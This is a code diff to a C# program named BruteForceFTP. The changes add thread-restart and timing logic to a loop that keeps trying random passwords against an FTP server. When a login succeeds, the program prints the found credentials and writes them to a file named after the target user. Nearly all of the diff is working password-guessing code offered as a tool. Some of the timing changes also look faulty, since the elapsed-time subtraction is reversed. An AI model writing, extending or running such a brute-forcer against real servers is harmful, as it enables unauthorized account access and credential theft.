@@ -10,6 +10,7 @@ using System.Timers;
 using System.Diagnostics;
 using WebCamService;
 using System.Linq.Expressions;
+using System.Timers;
 
 namespace BruteForceFTP
 {
@@ -60,9 +61,52 @@ namespace BruteForceFTP
             .Select(s => s[rand.Next(s.Length)]).ToArray());
         }
 
+        protected void restartThread(Thread thread)
+        {
+            string threadName = thread.Name;
+
+            thread.Abort();
+
+            Thread newThread = new Thread(new ThreadStart(Brute));
+
+            if (newThread.Name == null)
+            {
+                newThread.Name = threadName;
+            }
+
+            newThread.Start();
+        }
+
+        protected void onTimedEvent(object source, ElapsedEventArgs timeElapsed, Thread currThread)
+        {   
+            if(timeElapsed.SignalTime.Millisecond > 900)
+            {
+                // Console.WriteLine("The Elapsed event was raised at {0}", timeElapsed.SignalTime.Millisecond);
+
+                restartThread(currThread);
+            }
+        }
+
+        protected void elapsed(int time, Thread currThread)
+        {
+            if(time > 900)
+            {
+                restartThread(currThread);
+            }
+        }
+
         public void Brute()
         {
+            Thread currThread = Thread.CurrentThread;
             string credDetails = "";
+
+            int startime = DateTime.Now.Millisecond;
+
+            // System.Timers.Timer aTimer = new System.Timers.Timer();
+
+            // aTimer.Elapsed += delegate (object sender, ElapsedEventArgs elapsed) { onTimedEvent(sender, elapsed, currThread); };
+
+            // aTimer.AutoReset = true;
 
             while (!foundLogin)
             {
@@ -71,20 +115,27 @@ namespace BruteForceFTP
 
                 var pwd = pwd_num + pwd_chr;
 
+                // aTimer.Enabled = true;
+
                 FtpClient ftp = new FtpClient(srv, usr, pwd);
 
                 try
                 {
                     ftp.Login();
+                    
+                    int endtime = DateTime.Now.Millisecond;
+
+                    int totalTime = startime - endtime;
+
+                    elapsed(totalTime, currThread);
                 }
                 catch (FtpClient.FtpException returncode)
                 {
-                    // Console.WriteLine(pwd);
                     switch (returncode.Message)
                     {
                         case "530":
                             attempts += 1;
-                            Console.Write("\rAttempts: {0}", attempts);
+                            Console.Write("\r({0}) | Attempts: {1}", Thread.CurrentThread.Name.ToString(), attempts + "  ");
 
                             break;
                         case "230":
@@ -100,12 +151,11 @@ namespace BruteForceFTP
 
             Console.WriteLine("\n");
 
-            // Console.WriteLine("((" + Thread.CurrentThread.Name.ToString() + "))" + "((" + credDetails + "))");
+            Console.WriteLine("((" + Thread.CurrentThread.Name.ToString() + "))" + "((" + credDetails + "))");
 
             var path = (Directory.GetCurrentDirectory() + @"\" + usr + ".txt");
 
             File.WriteAllText(path, credDetails);
-
             Environment.Exit(1);
         }
 
@@ -113,8 +163,6 @@ namespace BruteForceFTP
         {
             public void createBruteThreads()
             {
-                var tasks = new List<Task>();
-
                 int workerThreadCount;
                 int ioThreadCount;
 
